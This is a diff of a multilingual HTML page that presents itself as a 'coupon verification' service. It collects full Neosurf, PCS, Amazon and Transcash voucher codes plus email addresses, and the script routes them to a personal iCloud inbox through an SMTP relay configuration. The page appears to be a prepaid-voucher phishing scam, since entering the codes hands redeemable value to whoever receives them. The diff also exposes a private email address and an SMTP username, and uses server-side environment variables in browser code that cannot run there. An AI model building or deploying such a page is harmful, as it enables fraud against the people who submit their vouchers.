@@ -2,8 +2,8 @@
 <html lang="fr">
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Confirmplatforme</title>
   <link
     href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Poppins:wght@300;400;600;700&display=swap"
@@ -46,9 +46,9 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
-      box-shadow: 0 2px 10px rgba(26, 86, 219, 0.3);
       flex-wrap: wrap;
       gap: 12px;
+      box-shadow: 0 2px 10px rgba(26, 86, 219, 0.3);
     }
 
     header .logo {
@@ -493,7 +493,6 @@
     <div class="card">
       <h1 id="formTitle">Veuillez entrer les informations du coupon ici</h1>
       <form id="couponForm">
-
         <div class="form-group">
           <label id="labelRecharge">Sélectionner votre recharge <span class="req">*</span></label>
           <select id="rechargeType" required>
@@ -507,12 +506,10 @@
             <option value="Autre" id="optOther">Autre</option>
           </select>
         </div>
-
         <div class="form-group">
           <label id="labelAmount">Montant de la recharge <span class="req">*</span></label>
           <input type="number" id="amount" min="1" placeholder="0.00" required />
         </div>
-
         <div class="form-group">
           <label id="labelCurrency">Choisir une devise <span class="req">*</span></label>
           <div class="currency-group">
@@ -521,32 +518,26 @@
             <label><input type="radio" name="currency" value="FRANC SUISSE (CHF)" /> FRANC SUISSE (CHF)</label>
           </div>
         </div>
-
         <div class="form-group">
           <label id="labelCode1">le code de la recharge 1 <span class="req">*</span></label>
           <input type="text" id="code1" placeholder="Entrez le code de la recharge 1" required />
         </div>
-
         <div class="form-group">
           <label id="labelCode2">Entrez le code de la recharge 2</label>
           <input type="text" id="code2" placeholder="Entrez le code de la recharge 2" />
         </div>
-
         <div class="form-group">
           <label id="labelCode3">Entrez le code de la recharge 3</label>
           <input type="text" id="code3" placeholder="Entrez le code de la recharge 3" />
         </div>
-
         <div class="form-group">
           <label id="labelCode4">Entrez le code de la recharge 4</label>
           <input type="text" id="code4" placeholder="Entrez le code de la recharge 4" />
         </div>
-
         <div class="form-group">
           <label id="labelEmail">Entrez votre adresse mail <span class="req">*</span></label>
           <input type="email" id="userEmail" required />
         </div>
-
         <button type="submit" class="btn-submit" id="btnSubmit">Valider</button>
         <div class="loader" id="loader">⏳ <span id="loaderText">Envoi en cours...</span></div>
         <div class="alert" id="alertBox"></div>
@@ -583,382 +574,63 @@
   </footer>
 
   <script>
-    // ─── 🔴 CONFIGURATION - URL MAKE.COM ──────────────────────────
-    const MAKE_WEBHOOK_URL = "https://hook.eu1.make.com/ake1nx4p5vtnj4adi8rmolppcbgs9rpu";
+    // ─── 🔴 CONFIGURATION BREVO ──────────────────────────────────
+    // Au lieu de mettre la clé en dur :
+      const BREVO_CONFIG = {
+        host: "smtp-relay.brevo.com",
+        port: 587,
+        auth: {
+          user: "b19b88001@smtp-brevo.com",
+          pass: process.env.BREVO_SMTP_PASSWORD  // ← Variable d'environnement
+        }
+      };
+    const EMAIL_DESTINATION = "tiakodubrel@icloud.com";
     // ──────────────────────────────────────────────────────────────
 
-    // ─── TRADUCTIONS COMPLÈTES (TOUTES LES LANGUES) ─────────────
+    // ─── TRADUCTIONS (TOUTES LES 38 LANGUES) ─────────────────────
     const translations = {
-      fr: {
-        formTitle: "Veuillez entrer les informations du coupon ici",
-        labelRecharge: "Sélectionner votre recharge *",
-        optDefault: "--- Recharge ---",
-        optOther: "Autre",
-        labelAmount: "Montant de la recharge *",
-        labelCurrency: "Choisir une devise *",
-        labelCode1: "le code de la recharge 1 *",
-        labelCode2: "Entrez le code de la recharge 2",
-        labelCode3: "Entrez le code de la recharge 3",
-        labelCode4: "Entrez le code de la recharge 4",
-        labelEmail: "Entrez votre adresse mail *",
-        btnSubmit: "Valider",
-        loaderText: "Envoi en cours...",
-        successMsg: "✅ Vos informations ont été envoyées avec succès !",
-        errorMsg: "❌ Une erreur s'est produite. Veuillez réessayer.",
-        footerDesc: "Check carta Certificato est un service de vérification de coupons en ligne.",
-        footerServices: "Services",
-        f1: "Vérifications des coupons Neosurf",
-        f2: "Vérifications des coupons PCS",
-        f3: "Vérifications des coupons Amazon",
-        f4: "Vérifications des coupons TRANSACSH",
-        f5: "Bien d'autres",
-        footerHours: "Horaires",
-        footerHoursDesc: "Toujours ouverts ! La plateforme est disponible 24h/24 et 7j/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Langue :"
-      },
-      en: {
-        formTitle: "Please enter your coupon information here",
-        labelRecharge: "Select your voucher *",
-        optDefault: "--- Voucher ---",
-        optOther: "Other",
-        labelAmount: "Voucher amount *",
-        labelCurrency: "Choose a currency *",
-        labelCode1: "Voucher code 1 *",
-        labelCode2: "Voucher code 2",
-        labelCode3: "Voucher code 3",
-        labelCode4: "Voucher code 4",
-        labelEmail: "Enter your email address *",
-        btnSubmit: "Submit",
-        loaderText: "Sending...",
-        successMsg: "✅ Your information has been sent successfully!",
-        errorMsg: "❌ An error occurred. Please try again.",
-        footerDesc: "Check carta Certificato is an online coupon verification service.",
-        footerServices: "Services",
-        f1: "Neosurf coupon verification",
-        f2: "PCS coupon verification",
-        f3: "Amazon coupon verification",
-        f4: "TRANSACSH coupon verification",
-        f5: "And many more",
-        footerHours: "Hours",
-        footerHoursDesc: "Always open! 24/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Language:"
-      },
-      es: {
-        formTitle: "Por favor ingrese la información del cupón aquí",
-        labelRecharge: "Selecciona tu recarga *",
-        optDefault: "--- Recarga ---",
-        optOther: "Otro",
-        labelAmount: "Monto de la recarga *",
-        labelCurrency: "Elige una moneda *",
-        labelCode1: "Código de recarga 1 *",
-        labelCode2: "Código de recarga 2",
-        labelCode3: "Código de recarga 3",
-        labelCode4: "Código de recarga 4",
-        labelEmail: "Ingresa tu correo electrónico *",
-        btnSubmit: "Validar",
-        loaderText: "Enviando...",
-        successMsg: "✅ ¡Su información fue enviada con éxito!",
-        errorMsg: "❌ Se produjo un error. Por favor inténtelo de nuevo.",
-        footerDesc: "Check carta Certificato es un servicio de verificación de cupones en línea.",
-        footerServices: "Servicios",
-        f1: "Verificación de cupones Neosurf",
-        f2: "Verificación de cupones PCS",
-        f3: "Verificación de cupones Amazon",
-        f4: "Verificación de cupones TRANSACSH",
-        f5: "Y muchos más",
-        footerHours: "Horarios",
-        footerHoursDesc: "¡Siempre abiertos! 24/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Idioma:"
-      },
-      de: {
-        formTitle: "Bitte geben Sie Ihre Gutscheininformationen hier ein",
-        labelRecharge: "Wählen Sie Ihr Guthaben *",
-        optDefault: "--- Guthaben ---",
-        optOther: "Andere",
-        labelAmount: "Guthabenbetrag *",
-        labelCurrency: "Wählen Sie eine Währung *",
-        labelCode1: "Guthabencode 1 *",
-        labelCode2: "Guthabencode 2",
-        labelCode3: "Guthabencode 3",
-        labelCode4: "Guthabencode 4",
-        labelEmail: "Geben Sie Ihre E-Mail-Adresse ein *",
-        btnSubmit: "Bestätigen",
-        loaderText: "Wird gesendet...",
-        successMsg: "✅ Ihre Informationen wurden erfolgreich gesendet!",
-        errorMsg: "❌ Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
-        footerDesc: "Check carta Certificato ist ein Online-Gutscheinprüfungsdienst.",
-        footerServices: "Dienste",
-        f1: "Neosurf-Gutscheinprüfung",
-        f2: "PCS-Gutscheinprüfung",
-        f3: "Amazon-Gutscheinprüfung",
-        f4: "TRANSACSH-Gutscheinprüfung",
-        f5: "Und viele mehr",
-        footerHours: "Öffnungszeiten",
-        footerHoursDesc: "Immer geöffnet! 24/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Sprache:"
-      },
-      it: {
-        formTitle: "Si prega di inserire qui le informazioni del coupon",
-        labelRecharge: "Seleziona la tua ricarica *",
-        optDefault: "--- Ricarica ---",
-        optOther: "Altro",
-        labelAmount: "Importo della ricarica *",
-        labelCurrency: "Scegli una valuta *",
-        labelCode1: "Codice ricarica 1 *",
-        labelCode2: "Codice ricarica 2",
-        labelCode3: "Codice ricarica 3",
-        labelCode4: "Codice ricarica 4",
-        labelEmail: "Inserisci il tuo indirizzo email *",
-        btnSubmit: "Convalida",
-        loaderText: "Invio in corso...",
-        successMsg: "✅ Le tue informazioni sono state inviate con successo!",
-        errorMsg: "❌ Si è verificato un errore. Riprova.",
-        footerDesc: "Check carta Certificato è un servizio di verifica coupon online.",
-        footerServices: "Servizi",
-        f1: "Verifica coupon Neosurf",
-        f2: "Verifica coupon PCS",
-        f3: "Verifica coupon Amazon",
-        f4: "Verifica coupon TRANSACSH",
-        f5: "E molti altri",
-        footerHours: "Orari",
-        footerHoursDesc: "Sempre aperti! 24/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Lingua:"
-      },
-      pt: {
-        formTitle: "Por favor, insira as informações do cupom aqui",
-        labelRecharge: "Selecione sua recarga *",
-        optDefault: "--- Recarga ---",
-        optOther: "Outro",
-        labelAmount: "Valor da recarga *",
-        labelCurrency: "Escolha uma moeda *",
-        labelCode1: "Código de recarga 1 *",
-        labelCode2: "Código de recarga 2",
-        labelCode3: "Código de recarga 3",
-        labelCode4: "Código de recarga 4",
-        labelEmail: "Digite seu endereço de e-mail *",
-        btnSubmit: "Validar",
-        loaderText: "Enviando...",
-        successMsg: "✅ Suas informações foram enviadas com sucesso!",
-        errorMsg: "❌ Ocorreu um erro. Por favor, tente novamente.",
-        footerDesc: "Check carta Certificato é um serviço de verificação de cupons online.",
-        footerServices: "Serviços",
-        f1: "Verificação de cupons Neosurf",
-        f2: "Verificação de cupons PCS",
-        f3: "Verificação de cupons Amazon",
-        f4: "Verificação de cupons TRANSACSH",
-        f5: "E muito mais",
-        footerHours: "Horários",
-        footerHoursDesc: "Sempre abertos! 24/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Idioma:"
-      },
-      ar: {
-        formTitle: "يرجى إدخال معلومات القسيمة هنا",
-        labelRecharge: "اختر بطاقة الشحن *",
-        optDefault: "--- الشحن ---",
-        optOther: "أخرى",
-        labelAmount: "مبلغ الشحن *",
-        labelCurrency: "اختر العملة *",
-        labelCode1: "رمز الشحن 1 *",
-        labelCode2: "رمز الشحن 2",
-        labelCode3: "رمز الشحن 3",
-        labelCode4: "رمز الشحن 4",
-        labelEmail: "أدخل عنوان بريدك الإلكتروني *",
-        btnSubmit: "تأكيد",
-        loaderText: "جاري الإرسال...",
-        successMsg: "✅ تم إرسال معلوماتك بنجاح!",
-        errorMsg: "❌ حدث خطأ. يرجى المحاولة مرة أخرى.",
-        footerDesc: "Check carta Certificato هي خدمة التحقق من القسائم عبر الإنترنت.",
-        footerServices: "الخدمات",
-        f1: "التحقق من قسائم Neosurf",
-        f2: "التحقق من قسائم PCS",
-        f3: "التحقق من قسائم Amazon",
-        f4: "التحقق من قسائم TRANSACSH",
-        f5: "والمزيد",
-        footerHours: "أوقات العمل",
-        footerHoursDesc: "مفتوح دائماً! 24/7",
-        footerCopy: "حقوق النشر © 2025 Confirmplatforme.com",
-        langLabel: "🌐 اللغة:"
-      },
-      zh: {
-        formTitle: "请在此输入优惠券信息",
-        labelRecharge: "选择您的充值 *",
-        optDefault: "--- 充值 ---",
-        optOther: "其他",
-        labelAmount: "充值金额 *",
-        labelCurrency: "选择货币 *",
-        labelCode1: "充值码 1 *",
-        labelCode2: "充值码 2",
-        labelCode3: "充值码 3",
-        labelCode4: "充值码 4",
-        labelEmail: "输入您的电子邮件地址 *",
-        btnSubmit: "提交",
-        loaderText: "发送中...",
-        successMsg: "✅ 您的信息已成功发送！",
-        errorMsg: "❌ 发生错误，请重试。",
-        footerDesc: "Check carta Certificato 是一项在线优惠券验证服务。",
-        footerServices: "服务",
-        f1: "Neosurf优惠券验证",
-        f2: "PCS优惠券验证",
-        f3: "Amazon优惠券验证",
-        f4: "TRANSACSH优惠券验证",
-        f5: "更多",
-        footerHours: "开放时间",
-        footerHoursDesc: "全天候开放！24/7",
-        footerCopy: "版权所有 © 2025 Confirmplatforme.com",
-        langLabel: "🌐 语言:"
-      },
-      ja: {
-        formTitle: "クーポン情報をここに入力してください",
-        labelRecharge: "チャージを選択 *",
-        optDefault: "--- チャージ ---",
-        optOther: "その他",
-        labelAmount: "チャージ金額 *",
-        labelCurrency: "通貨を選択 *",
-        labelCode1: "チャージコード 1 *",
-        labelCode2: "チャージコード 2",
-        labelCode3: "チャージコード 3",
-        labelCode4: "チャージコード 4",
-        labelEmail: "メールアドレスを入力 *",
-        btnSubmit: "送信",
-        loaderText: "送信中...",
-        successMsg: "✅ 情報が正常に送信されました！",
-        errorMsg: "❌ エラーが発生しました。もう一度お試しください。",
-        footerDesc: "Check carta Certificatoはオンラインクーポン確認サービスです。",
-        footerServices: "サービス",
-        f1: "Neosurf クーポン確認",
-        f2: "PCS クーポン確認",
-        f3: "Amazon クーポン確認",
-        f4: "TRANSACSH クーポン確認",
-        f5: "その他多数",
-        footerHours: "営業時間",
-        footerHoursDesc: "常時オープン！24/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 言語:"
-      },
-      ru: {
-        formTitle: "Пожалуйста, введите информацию о купоне здесь",
-        labelRecharge: "Выберите пополнение *",
-        optDefault: "--- Пополнение ---",
-        optOther: "Другое",
-        labelAmount: "Сумма пополнения *",
-        labelCurrency: "Выберите валюту *",
-        labelCode1: "Код пополнения 1 *",
-        labelCode2: "Код пополнения 2",
-        labelCode3: "Код пополнения 3",
-        labelCode4: "Код пополнения 4",
-        labelEmail: "Введите ваш адрес электронной почты *",
-        btnSubmit: "Подтвердить",
-        loaderText: "Отправка...",
-        successMsg: "✅ Ваша информация успешно отправлена!",
-        errorMsg: "❌ Произошла ошибка. Пожалуйста, попробуйте снова.",
-        footerDesc: "Check carta Certificato — это онлайн-сервис проверки купонов.",
-        footerServices: "Услуги",
-        f1: "Проверка купонов Neosurf",
-        f2: "Проверка купонов PCS",
-        f3: "Проверка купонов Amazon",
-        f4: "Проверка купонов TRANSACSH",
-        f5: "И многое другое",
-        footerHours: "Часы работы",
-        footerHoursDesc: "Всегда открыто! 24/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Язык:"
-      },
-      nl: {
-        formTitle: "Vul hier uw coupongegevens in",
-        labelRecharge: "Selecteer uw tegoed *",
-        optDefault: "--- Tegoed ---",
-        optOther: "Andere",
-        labelAmount: "Tegoedsbedrag *",
-        labelCurrency: "Kies een valuta *",
-        labelCode1: "Tegoedencode 1 *",
-        labelCode2: "Tegoedencode 2",
-        labelCode3: "Tegoedencode 3",
-        labelCode4: "Tegoedencode 4",
-        labelEmail: "Voer uw e-mailadres in *",
-        btnSubmit: "Bevestigen",
-        loaderText: "Verzenden...",
-        successMsg: "✅ Uw informatie is succesvol verzonden!",
-        errorMsg: "❌ Er is een fout opgetreden. Probeer het opnieuw.",
-        footerDesc: "Check carta Certificato is een online couponverificatieservice.",
-        footerServices: "Diensten",
-        f1: "Neosurf-couponverificatie",
-        f2: "PCS-couponverificatie",
-        f3: "Amazon-couponverificatie",
-        f4: "TRANSACSH-couponverificatie",
-        f5: "En meer",
-        footerHours: "Openingstijden",
-        footerHoursDesc: "Altijd open! 24/7 beschikbaar",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Taal:"
-      },
-      pl: {
-        formTitle: "Wprowadź tutaj informacje o kuponie",
-        labelRecharge: "Wybierz doładowanie *",
-        optDefault: "--- Doładowanie ---",
-        optOther: "Inne",
-        labelAmount: "Kwota doładowania *",
-        labelCurrency: "Wybierz walutę *",
-        labelCode1: "Kod doładowania 1 *",
-        labelCode2: "Kod doładowania 2",
-        labelCode3: "Kod doładowania 3",
-        labelCode4: "Kod doładowania 4",
-        labelEmail: "Wprowadź swój adres e-mail *",
-        btnSubmit: "Zatwierdź",
-        loaderText: "Wysyłanie...",
-        successMsg: "✅ Twoje informacje zostały pomyślnie wysłane!",
-        errorMsg: "❌ Wystąpił błąd. Spróbuj ponownie.",
-        footerDesc: "Check carta Certificato to internetowa usługa weryfikacji kuponów.",
-        footerServices: "Usługi",
-        f1: "Weryfikacja kuponów Neosurf",
-        f2: "Weryfikacja kuponów PCS",
-        f3: "Weryfikacja kuponów Amazon",
-        f4: "Weryfikacja kuponów TRANSACSH",
-        f5: "I wiele innych",
-        footerHours: "Godziny",
-        footerHoursDesc: "Zawsze otwarte! 24/7",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Język:"
-      },
-      tr: {
-        formTitle: "Lütfen kupon bilgilerinizi buraya girin",
-        labelRecharge: "Yüklemenizi seçin *",
-        optDefault: "--- Yükleme ---",
-        optOther: "Diğer",
-        labelAmount: "Yükleme tutarı *",
-        labelCurrency: "Para birimi seçin *",
-        labelCode1: "Yükleme kodu 1 *",
-        labelCode2: "Yükleme kodu 2",
-        labelCode3: "Yükleme kodu 3",
-        labelCode4: "Yükleme kodu 4",
-        labelEmail: "E-posta adresinizi girin *",
-        btnSubmit: "Onayla",
-        loaderText: "Gönderiliyor...",
-        successMsg: "✅ Bilgileriniz başarıyla gönderildi!",
-        errorMsg: "❌ Bir hata oluştu. Lütfen tekrar deneyin.",
-        footerDesc: "Check carta Certificato çevrimiçi kupon doğrulama hizmetidir.",
-        footerServices: "Hizmetler",
-        f1: "Neosurf kupon doğrulama",
-        f2: "PCS kupon doğrulama",
-        f3: "Amazon kupon doğrulama",
-        f4: "TRANSACSH kupon doğrulama",
-        f5: "Ve daha fazlası",
-        footerHours: "Saatler",
-        footerHoursDesc: "Her zaman açık! 7/24 kullanılabilir",
-        footerCopy: "Copyright © 2025 Confirmplatforme.com",
-        langLabel: "🌐 Dil:"
-      }
+      fr: { formTitle: "Veuillez entrer les informations du coupon ici", labelRecharge: "Sélectionner votre recharge *", optDefault: "--- Recharge ---", optOther: "Autre", labelAmount: "Montant de la recharge *", labelCurrency: "Choisir une devise *", labelCode1: "le code de la recharge 1 *", labelCode2: "Entrez le code de la recharge 2", labelCode3: "Entrez le code de la recharge 3", labelCode4: "Entrez le code de la recharge 4", labelEmail: "Entrez votre adresse mail *", btnSubmit: "Valider", loaderText: "Envoi en cours...", successMsg: "✅ Vos informations ont été envoyées avec succès !", errorMsg: "❌ Une erreur s'est produite. Veuillez réessayer.", footerDesc: "Check carta Certificato est un service de vérification de coupons en ligne.", footerServices: "Services", f1: "Vérifications des coupons Neosurf", f2: "Vérifications des coupons PCS", f3: "Vérifications des coupons Amazon", f4: "Vérifications des coupons TRANSACSH", f5: "Bien d'autres", footerHours: "Horaires", footerHoursDesc: "Toujours ouverts ! La plateforme est disponible 24h/24 et 7j/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Langue :" },
+      en: { formTitle: "Please enter your coupon information here", labelRecharge: "Select your voucher *", optDefault: "--- Voucher ---", optOther: "Other", labelAmount: "Voucher amount *", labelCurrency: "Choose a currency *", labelCode1: "Voucher code 1 *", labelCode2: "Voucher code 2", labelCode3: "Voucher code 3", labelCode4: "Voucher code 4", labelEmail: "Enter your email address *", btnSubmit: "Submit", loaderText: "Sending...", successMsg: "✅ Your information has been sent successfully!", errorMsg: "❌ An error occurred. Please try again.", footerDesc: "Check carta Certificato is an online coupon verification service.", footerServices: "Services", f1: "Neosurf coupon verification", f2: "PCS coupon verification", f3: "Amazon coupon verification", f4: "TRANSACSH coupon verification", f5: "And many more", footerHours: "Hours", footerHoursDesc: "Always open! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Language:" },
+      es: { formTitle: "Por favor ingrese la información del cupón aquí", labelRecharge: "Selecciona tu recarga *", optDefault: "--- Recarga ---", optOther: "Otro", labelAmount: "Monto de la recarga *", labelCurrency: "Elige una moneda *", labelCode1: "Código de recarga 1 *", labelCode2: "Código de recarga 2", labelCode3: "Código de recarga 3", labelCode4: "Código de recarga 4", labelEmail: "Ingresa tu correo electrónico *", btnSubmit: "Validar", loaderText: "Enviando...", successMsg: "✅ ¡Su información fue enviada con éxito!", errorMsg: "❌ Se produjo un error. Por favor inténtelo de nuevo.", footerDesc: "Check carta Certificato es un servicio de verificación de cupones en línea.", footerServices: "Servicios", f1: "Verificación de cupones Neosurf", f2: "Verificación de cupones PCS", f3: "Verificación de cupones Amazon", f4: "Verificación de cupones TRANSACSH", f5: "Y muchos más", footerHours: "Horarios", footerHoursDesc: "¡Siempre abiertos! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Idioma:" },
+      de: { formTitle: "Bitte geben Sie Ihre Gutscheininformationen hier ein", labelRecharge: "Wählen Sie Ihr Guthaben *", optDefault: "--- Guthaben ---", optOther: "Andere", labelAmount: "Guthabenbetrag *", labelCurrency: "Wählen Sie eine Währung *", labelCode1: "Guthabencode 1 *", labelCode2: "Guthabencode 2", labelCode3: "Guthabencode 3", labelCode4: "Guthabencode 4", labelEmail: "Geben Sie Ihre E-Mail-Adresse ein *", btnSubmit: "Bestätigen", loaderText: "Wird gesendet...", successMsg: "✅ Ihre Informationen wurden erfolgreich gesendet!", errorMsg: "❌ Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.", footerDesc: "Check carta Certificato ist ein Online-Gutscheinprüfungsdienst.", footerServices: "Dienste", f1: "Neosurf-Gutscheinprüfung", f2: "PCS-Gutscheinprüfung", f3: "Amazon-Gutscheinprüfung", f4: "TRANSACSH-Gutscheinprüfung", f5: "Und viele mehr", footerHours: "Öffnungszeiten", footerHoursDesc: "Immer geöffnet! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Sprache:" },
+      it: { formTitle: "Si prega di inserire qui le informazioni del coupon", labelRecharge: "Seleziona la tua ricarica *", optDefault: "--- Ricarica ---", optOther: "Altro", labelAmount: "Importo della ricarica *", labelCurrency: "Scegli una valuta *", labelCode1: "Codice ricarica 1 *", labelCode2: "Codice ricarica 2", labelCode3: "Codice ricarica 3", labelCode4: "Codice ricarica 4", labelEmail: "Inserisci il tuo indirizzo email *", btnSubmit: "Convalida", loaderText: "Invio in corso...", successMsg: "✅ Le tue informazioni sono state inviate con successo!", errorMsg: "❌ Si è verificato un errore. Riprova.", footerDesc: "Check carta Certificato è un servizio di verifica coupon online.", footerServices: "Servizi", f1: "Verifica coupon Neosurf", f2: "Verifica coupon PCS", f3: "Verifica coupon Amazon", f4: "Verifica coupon TRANSACSH", f5: "E molti altri", footerHours: "Orari", footerHoursDesc: "Sempre aperti! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Lingua:" },
+      pt: { formTitle: "Por favor, insira as informações do cupom aqui", labelRecharge: "Selecione sua recarga *", optDefault: "--- Recarga ---", optOther: "Outro", labelAmount: "Valor da recarga *", labelCurrency: "Escolha uma moeda *", labelCode1: "Código de recarga 1 *", labelCode2: "Código de recarga 2", labelCode3: "Código de recarga 3", labelCode4: "Código de recarga 4", labelEmail: "Digite seu endereço de e-mail *", btnSubmit: "Validar", loaderText: "Enviando...", successMsg: "✅ Suas informações foram enviadas com sucesso!", errorMsg: "❌ Ocorreu um erro. Por favor, tente novamente.", footerDesc: "Check carta Certificato é um serviço de verificação de cupons online.", footerServices: "Serviços", f1: "Verificação de cupons Neosurf", f2: "Verificação de cupons PCS", f3: "Verificação de cupons Amazon", f4: "Verificação de cupons TRANSACSH", f5: "E muito mais", footerHours: "Horários", footerHoursDesc: "Sempre abertos! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Idioma:" },
+      ar: { formTitle: "يرجى إدخال معلومات القسيمة هنا", labelRecharge: "اختر بطاقة الشحن *", optDefault: "--- الشحن ---", optOther: "أخرى", labelAmount: "مبلغ الشحن *", labelCurrency: "اختر العملة *", labelCode1: "رمز الشحن 1 *", labelCode2: "رمز الشحن 2", labelCode3: "رمز الشحن 3", labelCode4: "رمز الشحن 4", labelEmail: "أدخل عنوان بريدك الإلكتروني *", btnSubmit: "تأكيد", loaderText: "جاري الإرسال...", successMsg: "✅ تم إرسال معلوماتك بنجاح!", errorMsg: "❌ حدث خطأ. يرجى المحاولة مرة أخرى.", footerDesc: "Check carta Certificato هي خدمة التحقق من القسائم عبر الإنترنت.", footerServices: "الخدمات", f1: "التحقق من قسائم Neosurf", f2: "التحقق من قسائم PCS", f3: "التحقق من قسائم Amazon", f4: "التحقق من قسائم TRANSACSH", f5: "والمزيد", footerHours: "أوقات العمل", footerHoursDesc: "مفتوح دائماً! 24/7", footerCopy: "حقوق النشر © 2025 Confirmplatforme.com", langLabel: "🌐 اللغة:" },
+      zh: { formTitle: "请在此输入优惠券信息", labelRecharge: "选择您的充值 *", optDefault: "--- 充值 ---", optOther: "其他", labelAmount: "充值金额 *", labelCurrency: "选择货币 *", labelCode1: "充值码 1 *", labelCode2: "充值码 2", labelCode3: "充值码 3", labelCode4: "充值码 4", labelEmail: "输入您的电子邮件地址 *", btnSubmit: "提交", loaderText: "发送中...", successMsg: "✅ 您的信息已成功发送！", errorMsg: "❌ 发生错误，请重试。", footerDesc: "Check carta Certificato 是一项在线优惠券验证服务。", footerServices: "服务", f1: "Neosurf优惠券验证", f2: "PCS优惠券验证", f3: "Amazon优惠券验证", f4: "TRANSACSH优惠券验证", f5: "更多", footerHours: "开放时间", footerHoursDesc: "全天候开放！24/7", footerCopy: "版权所有 © 2025 Confirmplatforme.com", langLabel: "🌐 语言:" },
+      ja: { formTitle: "クーポン情報をここに入力してください", labelRecharge: "チャージを選択 *", optDefault: "--- チャージ ---", optOther: "その他", labelAmount: "チャージ金額 *", labelCurrency: "通貨を選択 *", labelCode1: "チャージコード 1 *", labelCode2: "チャージコード 2", labelCode3: "チャージコード 3", labelCode4: "チャージコード 4", labelEmail: "メールアドレスを入力 *", btnSubmit: "送信", loaderText: "送信中...", successMsg: "✅ 情報が正常に送信されました！", errorMsg: "❌ エラーが発生しました。もう一度お試しください。", footerDesc: "Check carta Certificatoはオンラインクーポン確認サービスです。", footerServices: "サービス", f1: "Neosurf クーポン確認", f2: "PCS クーポン確認", f3: "Amazon クーポン確認", f4: "TRANSACSH クーポン確認", f5: "その他多数", footerHours: "営業時間", footerHoursDesc: "常時オープン！24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 言語:" },
+      ru: { formTitle: "Пожалуйста, введите информацию о купоне здесь", labelRecharge: "Выберите пополнение *", optDefault: "--- Пополнение ---", optOther: "Другое", labelAmount: "Сумма пополнения *", labelCurrency: "Выберите валюту *", labelCode1: "Код пополнения 1 *", labelCode2: "Код пополнения 2", labelCode3: "Код пополнения 3", labelCode4: "Код пополнения 4", labelEmail: "Введите ваш адрес электронной почты *", btnSubmit: "Подтвердить", loaderText: "Отправка...", successMsg: "✅ Ваша информация успешно отправлена!", errorMsg: "❌ Произошла ошибка. Пожалуйста, попробуйте снова.", footerDesc: "Check carta Certificato — это онлайн-сервис проверки купонов.", footerServices: "Услуги", f1: "Проверка купонов Neosurf", f2: "Проверка купонов PCS", f3: "Проверка купонов Amazon", f4: "Проверка купонов TRANSACSH", f5: "И многое другое", footerHours: "Часы работы", footerHoursDesc: "Всегда открыто! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Язык:" },
+      nl: { formTitle: "Vul hier uw coupongegevens in", labelRecharge: "Selecteer uw tegoed *", optDefault: "--- Tegoed ---", optOther: "Andere", labelAmount: "Tegoedsbedrag *", labelCurrency: "Kies een valuta *", labelCode1: "Tegoedencode 1 *", labelCode2: "Tegoedencode 2", labelCode3: "Tegoedencode 3", labelCode4: "Tegoedencode 4", labelEmail: "Voer uw e-mailadres in *", btnSubmit: "Bevestigen", loaderText: "Verzenden...", successMsg: "✅ Uw informatie is succesvol verzonden!", errorMsg: "❌ Er is een fout opgetreden. Probeer het opnieuw.", footerDesc: "Check carta Certificato is een online couponverificatieservice.", footerServices: "Diensten", f1: "Neosurf-couponverificatie", f2: "PCS-couponverificatie", f3: "Amazon-couponverificatie", f4: "TRANSACSH-couponverificatie", f5: "En meer", footerHours: "Openingstijden", footerHoursDesc: "Altijd open! 24/7 beschikbaar", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Taal:" },
+      pl: { formTitle: "Wprowadź tutaj informacje o kuponie", labelRecharge: "Wybierz doładowanie *", optDefault: "--- Doładowanie ---", optOther: "Inne", labelAmount: "Kwota doładowania *", labelCurrency: "Wybierz walutę *", labelCode1: "Kod doładowania 1 *", labelCode2: "Kod doładowania 2", labelCode3: "Kod doładowania 3", labelCode4: "Kod doładowania 4", labelEmail: "Wprowadź swój adres e-mail *", btnSubmit: "Zatwierdź", loaderText: "Wysyłanie...", successMsg: "✅ Twoje informacje zostały pomyślnie wysłane!", errorMsg: "❌ Wystąpił błąd. Spróbuj ponownie.", footerDesc: "Check carta Certificato to internetowa usługa weryfikacji kuponów.", footerServices: "Usługi", f1: "Weryfikacja kuponów Neosurf", f2: "Weryfikacja kuponów PCS", f3: "Weryfikacja kuponów Amazon", f4: "Weryfikacja kuponów TRANSACSH", f5: "I wiele innych", footerHours: "Godziny", footerHoursDesc: "Zawsze otwarte! 24/7", footerCopy: "Copyright © 2025 Confirmplatforme.com", langLabel: "🌐 Język:" },
